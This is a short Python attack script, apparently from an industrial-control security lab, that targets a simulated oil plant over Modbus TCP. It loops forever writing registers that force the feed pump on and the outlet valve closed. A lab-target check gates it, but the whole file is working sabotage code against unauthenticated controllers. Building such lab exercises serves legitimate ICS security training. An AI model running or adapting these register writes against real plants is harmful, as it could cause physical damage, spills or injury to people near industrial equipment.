#!/usr/bin/env python3
"""Legacy oil plant disruption 1. Requires the external oil VM, not bottle-filling."""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

from pymodbus.client import ModbusTcpClient

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from lab_guard import LabTargetError, assert_lab_target


LOGGER = logging.getLogger("legacy.oilplant1")


def main() -> int:
    """Write feed pump ON and outlet valve CLOSED in a loop."""
    logging.basicConfig(level=logging.INFO)
    if len(sys.argv) < 2:
        LOGGER.error("usage: attack_oilplant1.py <lab-host>")
        return 2
    try:
        host = assert_lab_target(sys.argv[1])
    except LabTargetError as exc:
        LOGGER.error("%s", exc)
        return 2
    client = ModbusTcpClient(host=host, port=502)
    if not client.connect():
        LOGGER.error("unable to connect")
        return 1
    try:
        while True:
            client.write_register(address=1, value=1, device_id=1)
            client.write_register(address=3, value=0, device_id=1)
            time.sleep(0.5)
    except KeyboardInterrupt:
        LOGGER.info("stopped")
    finally:
        client.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
